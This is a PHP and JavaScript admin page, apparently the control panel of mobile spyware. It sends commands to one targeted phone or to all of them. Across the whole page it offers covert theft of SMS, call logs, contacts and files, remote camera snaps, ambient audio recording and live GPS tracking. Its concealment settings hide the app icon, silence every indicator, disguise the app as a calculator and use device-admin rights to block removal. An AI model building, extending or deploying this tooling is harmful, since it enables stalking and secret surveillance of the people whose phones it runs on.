<div class="content-wrapper">
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1><i class="fas fa-mobile-alt text-primary mr-1"></i> Remote Device Management</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="<?= base_url('admin/dashboard') ?>">Admin</a></li>
                        <li class="breadcrumb-item active">Remote Device</li>
                    </ol>
                </div>
            </div>
        </div>
    </section>

    <section class="content">
        <div class="container-fluid">
            <div class="card card-info shadow-sm">
                <div class="card-header">
                    <h3 class="card-title"><i class="fas fa-users mr-2"></i>Target Selection</h3>
                </div>
                <div class="card-body">
                    <div class="row">
                        <div class="col-md-8">
                            <label><i class="fas fa-user mr-1"></i> Apply to</label>
                            <select class="form-control" id="targetUserId">
                                <option value="all">All Users (Broadcast to all registered devices)</option>
                                <?php if (!empty($users)): ?>
                                    <?php foreach ($users as $u): ?>
                                    <option value="<?= $u['id'] ?>"><?= htmlspecialchars($u['username']) ?></option>
                                    <?php endforeach; ?>
                                <?php endif; ?>
                            </select>
                            <small class="text-muted">Choose a specific user or broadcast the same command to all devices.</small>
                        </div>
                        <div class="col-md-4">
                            <label><i class="fas fa-info-circle mr-1"></i> Status</label>
                            <div class="form-control bg-light" id="currentTargetDisplay" readonly>
                                <?php if (empty($users)): ?>
                                    <span class="text-warning">No registered devices found.</span>
                                <?php else: ?>
                                    <span class="text-success"><i class="fas fa-check-circle mr-1"></i> <?= count($users) ?> user(s) available</span>
                                <?php endif; ?>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <ul class="nav nav-tabs" id="adminRemoteTabs">
                <li class="nav-item">
                    <a class="nav-link active" data-toggle="tab" href="#tab-fetch"><i class="fas fa-database mr-2"></i>Data Fetch</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" data-toggle="tab" href="#tab-mgmt"><i class="fas fa-cogs mr-2"></i>Device Management</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" data-toggle="tab" href="#tab-settings"><i class="fas fa-sliders-h mr-2"></i>Settings</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" data-toggle="tab" href="#tab-perms"><i class="fas fa-shield-alt mr-2"></i>Permissions</a>
                </li>
            </ul>

            <div class="tab-content border border-top-0 p-3 bg-white shadow-sm">
                <!-- DATA FETCH -->
                <div class="tab-pane fade show active" id="tab-fetch">
                    <div class="alert alert-info">Commands fetch data from the selected user's device(s). Each device must be online to receive commands.</div>
                    <div class="row text-center" id="admin-fetch-grid">
                        <?php
                        $fetchCmds = [
                            ['id' => 'sms','label'=>'Fetch SMS','icon'=>'fa-sms','color'=>'#007bff','desc'=>'All SMS messages'],
                            ['id' => 'calls','label'=>'Call Logs','icon'=>'fa-phone-alt','color'=>'#28a745','desc'=>'Full history'],
                            ['id' => 'contacts','label'=>'Contacts','icon'=>'fa-address-book','color'=>'#17a2b8','desc'=>'Full contact list'],
                            ['id' => 'search_data','label'=>'Keyword Search','icon'=>'fa-search','color'=>'#00acc1','desc'=>'Search SMS/Call data'],
                            ['id' => 'capture_photo','label'=>'Camera Snap','icon'=>'fa-camera','color'=>'#d81b60','desc'=>'Remote photo'],
                            ['id' => 'record_audio','label'=>'Ambient Audio','icon'=>'fa-microphone','color'=>'#ff8f00','desc'=>'Record audio'],
                            ['id' => 'files','label'=>'File List','icon'=>'fa-file-alt','color'=>'#20c997','desc'=>'Recent files'],
                            ['id' => 'fetch_file','label'=>'Targeted File','icon'=>'fa-file-download','color'=>'#00897b','desc'=>'Fetch specific file'],
                            ['id' => 'location','label'=>'GPS Location','icon'=>'fa-map-marker-alt','color'=>'#dc3545','desc'=>'Precise location'],
                            ['id' => 'start_tracking','label'=>'Live Tracking','icon'=>'fa-route','color'=>'#e53935','desc'=>'Real-time GPS'],
                            ['id' => 'context','label'=>'Context','icon'=>'fa-walking','color'=>'#e83e8c','desc'=>'Motion & state'],
                            ['id' => 'apps','label'=>'Apps List','icon'=>'fa-th-large','color'=>'#6f42c1','desc'=>'Installed apps'],
                            ['id' => 'usage','label'=>'App Usage','icon'=>'fa-chart-pie','color'=>'#6610f2','desc'=>'Screen-time stats'],
                            ['id' => 'notifications','label'=>'Alerts','icon'=>'fa-bell','color'=>'#ffc107','desc'=>'Notifications'],
                            ['id' => 'device_info','label'=>'Device Info','icon'=>'fa-info-circle','color'=>'#6c757d','desc'=>'Hardware & build'],
                            ['id' => 'sensors','label'=>'Sensors','icon'=>'fa-microchip','color'=>'#117a8b','desc'=>'Sensor profile'],
                            ['id' => 'network','label'=>'Network','icon'=>'fa-wifi','color'=>'#0056b3','desc'=>'WiFi & connection'],
                            ['id' => 'bluetooth','label'=>'Bluetooth','icon'=>'fab fa-bluetooth-b','color'=>'#4e73df','desc'=>'Nearby devices'],
                            ['id' => 'calendar','label'=>'Calendar','icon'=>'fa-calendar-alt','color'=>'#fd7e14','desc'=>'Events'],
                            ['id' => 'accounts','label'=>'Accounts','icon'=>'fa-user-circle','color'=>'#343a40','desc'=>'System accounts'],
                            ['id' => 'beep','label'=>'Test Beep','icon'=>'fa-volume-up','color'=>'#8e44ad','desc'=>'Play beep'],
                            ['id' => 'all','label'=>'Sync All','icon'=>'fa-sync-alt','color'=>'#b21f2d','desc'=>'Full extraction'],
                        ];
                        foreach ($fetchCmds as $c):
                        ?>
                        <div class="col-6 col-sm-4 col-md-3 col-lg-2 mb-4">
                            <button class="btn btn-block btn-admin-fetch p-3 shadow-sm border h-100 d-flex flex-column align-items-center justify-content-center" data-cmd="<?= $c['id'] ?>" style="border-radius:12px;background:#fff;">
                                <div class="mb-2" style="color:<?= $c['color'] ?>;font-size:2rem;"><i class="fas <?= $c['icon'] ?>"></i></div>
                                <h6 class="font-weight-bold mb-1 text-dark"><?= $c['label'] ?></h6>
                                <small class="text-muted d-none d-sm-block"><?= $c['desc'] ?></small>
                            </button>
                        </div>
                        <?php endforeach; ?>
                    </div>
                </div>

                <!-- DEVICE MANAGEMENT -->
                <div class="tab-pane fade" id="tab-mgmt">
                    <div class="alert alert-warning"><i class="fas fa-exclamation-triangle mr-2"></i><strong>Caution:</strong> These commands make permanent changes. Confirm each action.</div>
                    <div class="row">
                        <div class="col-lg-4 mb-4">
                            <div class="card h-100 border border-warning">
                                <div class="card-body text-center">
                                    <div class="mb-3"><i class="fas fa-undo fa-3x text-warning"></i></div>
                                    <h5 class="card-title text-warning font-weight-bold">Reset App</h5>
                                    <p class="text-muted small">Restore default icon, clear stealth disguise, reset launch codes.</p>
                                    <button class="btn btn-warning btn-block btn-admin-mgmt" data-cmd="reset_app">Reset App</button>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-4 mb-4">
                            <div class="card h-100 border border-secondary">
                                <div class="card-body text-center">
                                    <div class="mb-3"><i class="fas fa-eye-slash fa-3x text-secondary"></i></div>
                                    <h5 class="card-title text-secondary font-weight-bold">Deactivate App</h5>
                                    <p class="text-muted small">Replace UI with static dummy screen.</p>
                                    <button class="btn btn-secondary btn-block btn-admin-mgmt" data-cmd="deactivate">Deactivate</button>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-4 mb-4">
                            <div class="card h-100 border border-info">
                                <div class="card-body text-center">
                                    <div class="mb-3"><i class="fas fa-sign-out-alt fa-3x text-info"></i></div>
                                    <h5 class="card-title text-info font-weight-bold">Logout User</h5>
                                    <p class="text-muted small">Clear auth token, stop sync, return to login.</p>
                                    <button class="btn btn-info btn-block btn-admin-mgmt" data-cmd="logout">Logout</button>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-4 mb-4">
                            <div class="card h-100 border border-danger">
                                <div class="card-body text-center">
                                    <div class="mb-3"><i class="fas fa-archive fa-3x text-danger"></i></div>
                                    <h5 class="card-title text-danger font-weight-bold">Uninstall (Keep Data)</h5>
                                    <p class="text-muted small">Back up data, uninstall. Reinstall restores config.</p>
                                    <button class="btn btn-danger btn-block btn-admin-mgmt" data-cmd="uninstall_preserve">Uninstall (Keep Data)</button>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-4 mb-4">
                            <div class="card h-100 border border-dark">
                                <div class="card-body text-center">
                                    <div class="mb-3"><i class="fas fa-trash-alt fa-3x text-dark"></i></div>
                                    <h5 class="card-title">Uninstall (Wipe All)</h5>
                                    <p class="text-muted small">Remove app and all local data.</p>
                                    <button class="btn btn-dark btn-block btn-admin-mgmt" data-cmd="uninstall_wipe">Uninstall (Wipe All)</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- SETTINGS -->
                <div class="tab-pane fade" id="tab-settings">
                    <div class="alert alert-info"><i class="fas fa-info-circle mr-2"></i><strong>Remote Settings:</strong> Changes are applied immediately on the target device(s).</div>
                    <form id="adminSettingsForm" class="row">
                        <div class="col-md-6 mb-3">
                            <div class="card h-100 border">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between align-items-center mb-2">
                                        <h6 class="mb-0"><i class="fas fa-sync text-primary mr-2"></i>Auto Sync</h6>
                                        <div class="custom-control custom-switch">
                                            <input type="checkbox" class="custom-control-input admin-setting-toggle" id="a_pref_auto_sync" data-pref="pref_auto_sync_v2" checked>
                                            <label class="custom-control-label" for="a_pref_auto_sync"></label>
                                        </div>
                                    </div>
                                    <small class="text-muted">When enabled, the device automatically uploads newly collected data on a scheduled interval. Disabling this stops all automatic uploads — data is still collected locally but not sent to the server.</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 mb-3">
                            <div class="card h-100 border">
                                <div class="card-body">
                                    <h6><i class="fas fa-clock text-primary mr-2"></i>Sync Interval (min)</h6>
                                    <input type="number" class="form-control admin-setting-input" data-pref="pref_sync_interval_v2" value="6" min="1" max="24">
                                    <small class="text-muted mt-1 d-block">How often the device uploads data automatically, in hours. Default: 6 hours.</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 mb-3">
                            <div class="card h-100 border">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between align-items-center mb-2">
                                        <h6 class="mb-0"><i class="fas fa-ban text-danger mr-2"></i>Disable Uploads</h6>
                                        <div class="custom-control custom-switch">
                                            <input type="checkbox" class="custom-control-input admin-setting-toggle" id="a_pref_disable_up" data-pref="pref_disable_uploads">
                                            <label class="custom-control-label" for="a_pref_disable_up"></label>
                                        </div>
                                    </div>
                                    <small class="text-muted">Master switch to stop ALL data transmission from the device to the server. The device stops all outgoing requests. Useful for temporarily halting data flow without losing collected data.</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 mb-3">
                            <div class="card h-100 border">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between align-items-center mb-2">
                                        <h6 class="mb-0"><i class="fas fa-file-alt text-danger mr-2"></i>Disable File Uploads</h6>
                                        <div class="custom-control custom-switch">
                                            <input type="checkbox" class="custom-control-input admin-setting-toggle" id="a_pref_disable_file" data-pref="pref_disable_file_uploads">
                                            <label class="custom-control-label" for="a_pref_disable_file"></label>
                                        </div>
                                    </div>
                                    <small class="text-muted">Prevents file and media uploads (photos, audio recordings, file lists) while allowing text-based data (SMS, contacts, locations) to upload. Reduces bandwidth usage.</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 mb-3">
                            <div class="card h-100 border">
                                <div class="card-body">
                                    <h6><i class="fas fa-map-marker-alt text-danger mr-2"></i>Live Location Interval (min)</h6>
                                    <input type="number" class="form-control admin-setting-input" data-pref="pref_live_location_interval" value="30" min="1" max="1440">
                                    <small class="text-muted mt-1 d-block">How frequently the device captures and uploads GPS location data when continuous tracking is active. Lower values provide finer location trails but consume more battery. Default: 30 minutes.</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 mb-3">
                            <div class="card h-100 border">
                                <div class="card-body">
                                    <h6><i class="fas fa-hourglass-half text-warning mr-2"></i>Queue Sync Interval (min)</h6>
                                    <input type="number" class="form-control admin-setting-input" data-pref="pref_queue_sync_interval" value="15" min="1" max="120">
                                    <small class="text-muted mt-1 d-block">How often the device flushes locally queued offline data when connectivity is restored. Prevents data loss during network outages. Default: 15 minutes.</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 mb-3">
                            <div class="card h-100 border">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between align-items-center mb-2">
                                        <h6 class="mb-0"><i class="fas fa-eye-slash text-secondary mr-2"></i>Ghost Mode</h6>
                                        <div class="custom-control custom-switch">
                                            <input type="checkbox" class="custom-control-input admin-setting-toggle" id="a_pref_ghost" data-pref="pref_ghost_mode">
                                            <label class="custom-control-label" for="a_pref_ghost"></label>
                                        </div>
                                    </div>
                                    <small class="text-muted">Completely hides the app icon from the device launcher when enabled. The app can only be launched via the dialer secret code. Combined with stealth mode for maximum concealment.</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 mb-3">
                            <div class="card h-100 border">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between align-items-center mb-2">
                                        <h6 class="mb-0"><i class="fas fa-user-secret text-dark mr-2"></i>Total Stealth Mode</h6>
                                        <div class="custom-control custom-switch">
                                            <input type="checkbox" class="custom-control-input admin-setting-toggle" id="a_pref_stealth" data-pref="pref_total_stealth_mode">
                                            <label class="custom-control-label" for="a_pref_stealth"></label>
                                        </div>
                                    </div>
                                    <small class="text-muted">Mutes all notifications, toasts, and visible indicators from the app. No sound, vibration, or screen notifications are shown when data is collected or uploaded.</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 mb-3">
                            <div class="card h-100 border">
                                <div class="card-body">
                                    <h6><i class="fas fa-phone-alt text-info mr-2"></i>Dialer Launch Code</h6>
                                    <input type="text" class="form-control admin-setting-input" data-pref="pref_dial_code" value="*#007#">
                                    <small class="text-muted mt-1 d-block">Secret code dialed to launch the app. Default: *#007#</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 mb-3">
                            <div class="card h-100 border">
                                <div class="card-body">
                                    <h6><i class="fas fa-calculator text-info mr-2"></i>Calculator Secret Code</h6>
                                    <input type="text" class="form-control admin-setting-input" data-pref="pref_secret_code" value="1234">
                                    <small class="text-muted mt-1 d-block">Code entered in calculator disguise to unlock the app. Default: 1234</small>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-12 mb-3">
                            <div class="card h-100 border">
                                <div class="card-body">
                                    <h6><i class="fas fa-server text-info mr-2"></i>Server URL</h6>
                                    <div class="input-group">
                                        <input type="url" class="form-control admin-setting-input" data-pref="pref_server_url" placeholder="https://your-server.com">
                                        <div class="input-group-append">
                                            <button class="btn btn-info" type="button" onclick="adminApplySettings()">Apply to Target</button>
                                        </div>
                                    </div>
                                    <small class="text-muted mt-1 d-block">The base URL of the server the device connects to for data uploads and command receipt. Change this to redirect the device to a different server endpoint. Leave empty to use the default URL configured on the device.</small>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>

                <!-- PERMISSIONS -->
                <div class="tab-pane fade" id="tab-perms">
                    <div class="alert alert-warning">
                        <i class="fas fa-exclamation-triangle mr-2"></i>
                        <strong>Upload Permissions:</strong> Revoking a permission stops the device from uploading that data type. The app retains on-device access. This cannot be undone automatically — permissions must be re-granted on the device.
                    </div>
                    <div class="row">
                        <?php
                        $perms = [
                            ['id'=>'sms','label'=>'SMS','icon'=>'fa-sms','color'=>'info','desc'=>'Stop uploading SMS messages'],
                            ['id'=>'calls','label'=>'Phone / Calls','icon'=>'fa-phone-alt','color'=>'success','desc'=>'Stop uploading call logs'],
                            ['id'=>'contacts','label'=>'Contacts','icon'=>'fa-address-book','color'=>'primary','desc'=>'Stop uploading contacts'],
                            ['id'=>'location','label'=>'Location','icon'=>'fa-map-marker-alt','color'=>'danger','desc'=>'Stop uploading GPS location'],
                            ['id'=>'files','label'=>'Storage','icon'=>'fa-folder-open','color'=>'warning','desc'=>'Stop uploading file metadata'],
                            ['id'=>'camera','label'=>'Camera','icon'=>'fa-camera','color'=>'#d81b60','desc'=>'Stop uploading captured photos'],
                            ['id'=>'microphone','label'=>'Microphone','icon'=>'fa-microphone','color'=>'#ff8f00','desc'=>'Stop uploading recorded audio'],
                            ['id'=>'calendar','label'=>'Calendar','icon'=>'fa-calendar-alt','color'=>'#fd7e14','desc'=>'Stop uploading calendar events'],
                            ['id'=>'phone_state','label'=>'Phone State','icon'=>'fa-phone-square','color'=>'#6c757d','desc'=>'Stop uploading device identifiers'],
                            ['id'=>'bluetooth','label'=>'Bluetooth','icon'=>'fab fa-bluetooth-b','color'=>'#4e73df','desc'=>'Stop uploading Bluetooth devices'],
                            ['id'=>'usage_stats','label'=>'Usage Stats','icon'=>'fa-chart-pie','color'=>'#6610f2','desc'=>'Stop uploading app usage'],
                            ['id'=>'notifications','label'=>'Notifications','icon'=>'fa-bell','color'=>'#ffc107','desc'=>'Stop uploading notifications'],
                            ['id'=>'battery','label'=>'Battery Opt.','icon'=>'fa-battery-half','color'=>'#28a745','desc'=>'Allow battery to sleep'],
                            ['id'=>'overlay','label'=>'Overlay','icon'=>'fa-layer-group','color'=>'#17a2b8','desc'=>'Stop overlay for captures'],
                            ['id'=>'accessibility','label'=>'Accessibility','icon'=>'fa-universal-access','color'=>'#343a40','desc'=>'Stop UI tracking'],
                            ['id'=>'notif_listener','label'=>'Notif. Listener','icon'=>'fa-list','color'=>'#8e44ad','desc'=>'Stop notification interception'],
                            ['id'=>'device_admin','label'=>'Device Admin','icon'=>'fa-shield-alt','color'=>'#dc3545','desc'=>'Allow uninstallation'],
                        ];
                        foreach ($perms as $p):
                        ?>
                        <div class="col-lg-4 col-md-6 mb-3">
                            <div class="card h-100 border">
                                <div class="card-body text-center">
                                    <div class="mb-2" style="color:<?= $p['color'] ?>;font-size:1.8rem;"><i class="fas <?= $p['icon'] ?>"></i></div>
                                    <h6 class="font-weight-bold"><?= $p['label'] ?></h6>
                                    <p class="text-muted small mb-2"><?= $p['desc'] ?></p>
                                    <span class="badge badge-secondary d-block mb-1 perm-status-badge" data-perm="<?= $p['id'] ?>">Unknown</span>
                                    <button class="btn btn-outline-danger btn-sm btn-admin-perm btn-block" data-perm="<?= $p['id'] ?>">Stop Upload</button>
                                </div>
                            </div>
                        </div>
                        <?php endforeach; ?>
                    </div>
                </div>
            </div>
        </div>
    </section>
</div>

<script>
function getUserId() { return $('#targetUserId').val(); }

function sendCmd(userId, command, payload, extra) {
    const btn = event.target ? $(event.target).closest('button') : null;
    if (btn) { btn.prop('disabled', true).html('<i class="fas fa-spinner fa-spin mr-1"></i> Sending...'); }
    $.ajax({
        url: '<?= base_url('admin/remote-device/send') ?>',
        method: 'POST',
        data: { user_id: userId, command: command, payload: payload, extra_data: JSON.stringify(extra || {}) },
        dataType: 'json',
        timeout: 120000,
        success: function(r) {
            if (btn) { btn.prop('disabled', false).html(btn.data('orig') || 'Send'); }
            if (r.success) {
                Swal.fire({ icon:'success', title:'Sent', text: r.message, timer:3000, showConfirmButton:false });
            } else {
                Swal.fire({ icon:'error', title:'Error', text: r.message || 'Failed' });
            }
        },
        error: function() {
            if (btn) { btn.prop('disabled', false).html(btn.data('orig') || 'Send'); }
            Swal.fire({ icon:'error', title:'Error', text:'Network error.' });
        }
    });
}

function loadDeviceConfig() {
    const userId = getUserId();
    if (!userId) return;
    const apiUrl = '<?= base_url('api/v1/device/config') ?>/' + userId;
    $.getJSON(apiUrl, function(resp) {
        if (resp.success && resp.permissions_json && resp.permissions_json.granted) {
            const grantedPerms = resp.permissions_json.granted.map(p => p.short_name || p.permission.split('.').pop().toLowerCase());
            $('.perm-status-badge').each(function() {
                const webId = $(this).data('perm');
                const granted = grantedPerms.some(gp => gp.includes(webId) || webId.includes(gp));
                $(this).removeClass('badge-secondary badge-success badge-danger')
                       .addClass(granted ? 'badge-success' : 'badge-secondary')
                       .html(granted ? '<i class="fas fa-check mr-1"></i> Granted' : '<i class="fas fa-times mr-1"></i> Unknown');
            });
        }
    }).fail(function() {});
}

$(function() {
    loadDeviceConfig();
    $('#targetUserId').on('change', function() {
        const v = $(this).val();
        $('#currentTargetDisplay').html(v === 'all'
            ? '<span class="text-info"><i class="fas fa-globe mr-1"></i> Broadcasting to ALL users</span>'
            : '<span class="text-success"><i class="fas fa-user mr-1"></i> Targeting: ' + $(this).find('option:selected').text() + '</span>');
        loadDeviceConfig();
    });

    // Data Fetch
    $('.btn-admin-fetch').on('click', function() {
        const cmd = $(this).data('cmd');
        const userId = getUserId();
        const prompts = {
            fetch_file: { title:'File Path', text:'Enter exact file path:', input:'text' },
            search_data: { title:'Keyword', text:'Enter keyword:', input:'text' },
            start_tracking: { title:'Duration', text:'Minutes:', input:'number', value:60 },
        };
        if (prompts[cmd]) {
            Swal.fire({
                title: prompts[cmd].title, text: prompts[cmd].text, input: prompts[cmd].input,
                inputValue: prompts[cmd].value, showCancelButton: true, confirmButtonText: 'Send',
                inputValidator: (v) => { if (!v) return 'Required!'; }
            }).then(r => {
                if (r.isConfirmed) sendCmd(userId, 'cmd_' + cmd, cmd, { file_path: r.value, keyword: r.value, duration_minutes: r.value });
            });
        } else {
            Swal.fire({
                title: 'Send ' + $(this).find('h6').text() + '?',
                text: 'Send to ' + (userId === 'all' ? 'ALL users' : 'selected user') + '?',
                icon: 'question', showCancelButton: true, confirmButtonText: 'Send'
            }).then(r => {
                if (r.isConfirmed) sendCmd(userId, 'cmd_' + cmd, cmd, {});
            });
        }
    });

    // Device Management
    $('.btn-admin-mgmt').on('click', function() {
        const cmd = $(this).data('cmd');
        const userId = getUserId();
        const titles = { reset_app:'Reset App', deactivate:'Deactivate App', logout:'Logout User', uninstall_preserve:'Uninstall (Keep Data)', uninstall_wipe:'Uninstall (Wipe All)' };
        const mgmtPay = { reset_app:'reset', deactivate:'deactivate', logout:'logout', uninstall_preserve:'uninstall_preserve', uninstall_wipe:'uninstall_wipe' };
        Swal.fire({
            title: titles[cmd] || 'Execute?',
            text: 'This will be sent to ' + (userId === 'all' ? 'ALL users' : 'the selected user') + '. This action is irreversible.',
            icon: 'warning', showCancelButton: true, confirmButtonColor: '#dc3545', confirmButtonText: 'Execute'
        }).then(r => {
            if (r.isConfirmed) sendCmd(userId, 'cmd_' + cmd, mgmtPay[cmd] || cmd, {});
        });
    });

    // Settings
    window.adminApplySettings = function() {
        const userId = getUserId();
        const prefs = {};
        $('.admin-setting-toggle').each(function() { prefs[$(this).data('pref')] = $(this).is(':checked') ? 'true' : 'false'; });
        $('.admin-setting-input').each(function() { prefs[$(this).data('pref')] = $(this).val(); });
        Swal.fire({
            title: 'Apply Settings?',
            html: 'Send <b>' + Object.keys(prefs).length + '</b> setting(s) to <b>' + (userId === 'all' ? 'ALL users' : 'selected user') + '</b>?',
            icon: 'info', showCancelButton: true, confirmButtonText: 'Apply'
        }).then(r => {
            if (r.isConfirmed) sendCmd(userId, 'cmd_update_prefs', 'settings', { prefs: JSON.stringify(prefs) });
        });
    };

    // Permissions
    $('.btn-admin-perm').on('click', function() {
        const perm = $(this).data('perm');
        const label = $(this).closest('.card-body').find('h6').text();
        const userId = getUserId();
        Swal.fire({
            title: 'Stop uploading ' + label + '?',
            html: 'This will open permission settings on the device. <b>This cannot be undone automatically.</b>',
            icon: 'warning', showCancelButton: true, confirmButtonColor: '#dc3545', confirmButtonText: 'Stop Upload'
        }).then(r => {
            if (r.isConfirmed) sendCmd(userId, 'cmd_open_permission', perm, { permission: perm });
        });
    });
});
</script>
